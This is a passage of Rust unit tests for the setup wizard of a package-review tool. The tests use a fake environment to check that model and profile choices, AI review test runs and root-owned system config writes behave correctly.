        /// are its user's, so the answer is the test's to give.
        fn secure(&self, path: &Path) -> Result<(), crate::config::load::Insecure> {
            self.system_insecure.map_or(Ok(()), |uid| {
                Err(crate::config::load::Insecure::owned_by(path, uid))
            })
        }
    }

    impl Environment for Fake {
        fn user_opencode(&self) -> Option<PathBuf> {
            self.opencode
                .then(|| PathBuf::from("/home/u/.opencode/bin/opencode"))
        }
        fn system_opencode(&self) -> bool {
            false
        }
        fn user_claude(&self) -> bool {
            self.claude
        }
        fn system_claude(&self) -> bool {
            false
        }
        fn models(&self) -> Vec<String> {
            if self.no_models {
                return Vec::new();
            }
            let mut models: Vec<String> = if self.claude {
                vec![
                    "claude-code/claude-sonnet-5-5".into(),
                    "claude-code/claude-haiku-4-5".into(),
                ]
            } else {
                Vec::new()
            };
            models.extend([
                "anthropic/claude-sonnet-5".into(),
                "anthropic/claude-haiku-4-5".into(),
            ]);
            models
        }
        fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String> {
            self.tested.borrow_mut().push(settings.clone());
            let failing =
                self.failing_model.is_some() && settings.model.as_deref() == self.failing_model;
            if self.test_passes && !failing {
                Ok(Duration::from_secs(3))
            } else {
                Err("the model did not flag the malicious sample".into())
            }
        }
        fn existing_system(&self) -> Result<Option<super::SystemFile>, String> {
            let Some(path) = &self.system_path else {
                return Ok(None);
            };
            let secure = |path: &Path| self.secure(path);
            super::load_system(&super::Place {
                path,
                secure: &secure,
            })
        }
        fn write_user(&self, text: &str) -> Result<PathBuf, String> {
            *self.user_written.borrow_mut() = Some(text.to_string());
            Ok(PathBuf::from(
                "/home/u/.config/omarchy-guardian/config.toml",
            ))
        }
        fn write_system(&self, text: &str) -> Result<(), String> {
            let record = |text: &str| {
                *self.system_written.borrow_mut() = Some(text.to_string());
                Ok(())
            };
            let Some(path) = &self.system_path else {
                return record(text);
            };
            let secure = |path: &Path| self.secure(path);
            let place = super::Place {
                path,
                secure: &secure,
            };
            super::write_system_at(&place, &record, text)
        }
        fn hook_enabled(&self) -> bool {
            true
        }
    }

    fn script(answers: &[&'static str]) -> Script {
        Script {
            answers: answers.iter().copied().collect(),
            output: String::new(),
        }
    }

    mod diff;
    mod system_file;

    #[test]
    fn saving_setup_keeps_the_system_only_settings() {
        let existing = "# old\ntrusted_reviewer_packages = [\"opencode-bin\"]\n\n[sweep]\nroot = \"allowed\"\ngroup = \"wheel\"\n";
        let existing = parse(Path::new("s"), existing).unwrap();
        let new = "# Written by setup\nprofile = \"strict\"\n";
        let kept = super::keep_system_only(new, &existing).unwrap();
        let parsed = parse(Path::new("s"), &kept).unwrap();
        assert!(kept.starts_with("# Written by setup\n"));
        assert_eq!(
            parsed.trusted_reviewer_packages,
            Some(vec!["opencode-bin".to_string()])
        );
        assert_eq!(parsed.sweep.group.as_deref(), Some("wheel"));
        assert_eq!(parsed.profile, Some(Profile::Strict));
        // Nothing to carry over: the text is installed as written.
        let standard = parse(Path::new("s"), "profile = \"standard\"\n").unwrap();
        assert_eq!(super::keep_system_only(new, &standard).unwrap(), new);
    }

    #[test]
    fn defaults_write_valid_files() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        // profile (default), model 2 = sonnet, official model (default),
        // thinking (default), confirm the system write
        let mut terminal = script(&["", "2", "", "", "y"]);

        run(&mut terminal, &environment).unwrap();

        let user = environment.user_written.borrow().clone().unwrap();
        let system = environment.system_written.borrow().clone().unwrap();
        let user_config = parse(Path::new("user"), &user).unwrap();
        let system_config = parse(Path::new("system"), &system).unwrap();
        assert_eq!(user_config.profile, Some(Profile::Standard));
        assert_eq!(
            system_config.agent.model.as_deref(),
            Some("anthropic/claude-sonnet-5")
        );
        assert!(terminal.output.contains("root-owned"));
        assert_eq!(environment.tested.borrow()[0].thinking, Thinking::High);
        assert_eq!(
            environment.tested.borrow()[0].variant.as_deref(),
            Some("high")
        );

        let tested = vec![(Thinking::High, "high".to_string())];
        assert_eq!(user_config.agent.variants, tested);
        assert_eq!(system_config.agent.variants, tested);
    }

    #[test]
    fn with_claude_code_installed_setup_suggests_it() {
        let environment = Fake {
            claude: true,
            test_passes: true,
            ..Fake::default()
        };
        // Every answer is the default: profile, model, official model,
        // thinking, then confirm the system write.
        let mut terminal = script(&["", "", "", "", "y"]);

        run(&mut terminal, &environment).unwrap();

        let user = environment.user_written.borrow().clone().unwrap();
        let user_config = parse(Path::new("user"), &user).unwrap();
        assert_eq!(user_config.profile, Some(Profile::Standard));
        assert_eq!(
            user_config.agent.model.as_deref(),
            Some("claude-code/claude-sonnet-5-5")
        );
        assert!(terminal.output.contains("Claude Code found"));
        assert!(terminal.output.contains("sudo pacman -S claude-code"));
    }

    #[test]
    fn without_a_model_list_setup_accepts_a_typed_model() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            no_models: true,
            ..Fake::default()
        };
        // profile (default), an invalid then a valid review model, official
        // model empty (OpenCode default), thinking (default), confirm
        let mut terminal = script(&["", "no-slash", "ollama/qwen3", "", "", "y"]);

        run(&mut terminal, &environment).unwrap();

        assert!(terminal.output.contains("Enter provider/model"));
        assert!(
            terminal
                .output
                .contains("Please enter the model as provider/model")
        );
        assert_eq!(
            environment.tested.borrow()[0].model.as_deref(),
            Some("ollama/qwen3")
        );
        let system = environment.system_written.borrow().clone().unwrap();
        let system_config = parse(Path::new("system"), &system).unwrap();
        assert_eq!(system_config.agent.model.as_deref(), Some("ollama/qwen3"));
        assert_eq!(
            system_config
                .class(crate::config::model::SourceClass::Official)
                .model,
            None
        );
    }

    #[test]
    fn the_official_package_pairing_is_tested_too() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        // profile (default), review model 2 = sonnet, official model 3 =
        // haiku, thinking (default high), confirm the system write
        let mut terminal = script(&["", "2", "3", "", "y"]);

        run(&mut terminal, &environment).unwrap();

        assert!(
            terminal
                .output
                .contains("Same as the review model (anthropic/claude-sonnet-5)")
        );
        let tested = environment.tested.borrow();
        assert_eq!(tested.len(), 2);
        assert_eq!(
            tested[1].model.as_deref(),
            Some("anthropic/claude-haiku-4-5")
        );
        assert_eq!(tested[1].thinking, Thinking::Low);
        assert_eq!(tested[1].variant, None);
    }

    #[test]
    fn a_failing_official_model_writes_nothing() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            failing_model: Some("anthropic/claude-haiku-4-5"),
            ..Fake::default()
        };
        // profile (default), sonnet, haiku, thinking (default), decline retry
        let mut terminal = script(&["", "2", "3", "", "n"]);

        assert!(run(&mut terminal, &environment).is_err());
        assert!(terminal.output.contains("official-package reviewer"));
        assert!(environment.user_written.borrow().is_none());
        assert!(environment.system_written.borrow().is_none());
    }

    #[test]
    fn an_identical_official_pairing_is_tested_once() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        // profile (default), sonnet, official = same, thinking 3 = low (the
        // standard profile's official level), confirm the system write
        let mut terminal = script(&["", "2", "", "3", "y"]);

        run(&mut terminal, &environment).unwrap();

        let tested = environment.tested.borrow();
        assert_eq!(tested.len(), 1);
        assert_eq!(tested[0].variant.as_deref(), Some("low"));
    }

    #[test]
    fn a_failed_test_run_writes_nothing() {
        let environment = Fake {
            opencode: true,
            test_passes: false,
            ..Fake::default()
        };
        // profile, model, official model, thinking, then decline to retry
        let mut terminal = script(&["2", "", "", "", "n"]);

        assert!(run(&mut terminal, &environment).is_err());
        assert!(environment.user_written.borrow().is_none());
        assert!(environment.system_written.borrow().is_none());
    }

    #[test]
    fn without_opencode_local_only_skips_the_agent_steps() {
        let environment = Fake::default();
        // accept recommended profile, confirm system write
        let mut terminal = script(&["", "y"]);

        run(&mut terminal, &environment).unwrap();

        assert!(environment.tested.borrow().is_empty());
        let user = environment.user_written.borrow().clone().unwrap();
        assert!(user.contains("profile = \"local-only\""));
        assert!(!user.contains("[agent.variants]"));
    }

    #[test]
    fn default_thinking_is_tested_and_written_without_a_variant() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        // profile (default), model (default), official model (default),
        // thinking 1 = default, confirm the system write
        let mut terminal = script(&["", "", "", "1", "y"]);

        run(&mut terminal, &environment).unwrap();

        assert_eq!(environment.tested.borrow()[0].variant, None);
        let user = environment.user_written.borrow().clone().unwrap();
        let system = environment.system_written.borrow().clone().unwrap();
        assert!(!user.contains("[agent.variants]"));
        assert!(!system.contains("[agent.variants]"));
    }

    #[test]
    fn declining_the_system_write_keeps_the_user_file() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        let mut terminal = script(&["", "", "", "", "n"]);

        run(&mut terminal, &environment).unwrap();
        assert!(environment.user_written.borrow().is_some());
        assert!(environment.system_written.borrow().is_none());
        assert!(terminal.output.contains("pacman gate keeps"));
    }

    #[test]
    fn rendered_files_parse() {
        let choice = Choice {
            profile: Profile::Strict,
            model: Some("anthropic/claude-sonnet-5".into()),
            official_model: Some("anthropic/claude-haiku-4-5".into()),
            thinking: Thinking::Max,
        };
        let user = parse(Path::new("u"), &render_user(&choice)).unwrap();
        let system = parse(Path::new("s"), &render_system(&choice)).unwrap();
        assert_eq!(user.profile, Some(Profile::Strict));
        assert_eq!(system.profile, Some(Profile::Strict));
        assert_eq!(
            system
                .class(crate::config::model::SourceClass::Official)
                .model
                .as_deref(),
            Some("anthropic/claude-haiku-4-5")
        );
    }

    #[test]
    fn read_answer_distinguishes_eof_from_an_empty_line() {
        assert_eq!(read_answer(&b""[..]), None);
        assert_eq!(read_answer(&b"\n"[..]), Some("\n".to_string()));
        assert_eq!(read_answer(&b"2\n"[..]), Some("2\n".to_string()));
    }

    #[test]
    fn a_quote_in_the_model_name_fails_validation_instead_of_corrupting_the_file() {
        let choice = Choice {
            profile: Profile::Standard,
            model: Some("a/b\"#x".into()),
            official_model: None,
            thinking: Thinking::High,
        };
        assert!(validate_rendered(&choice).is_err());
    }
}
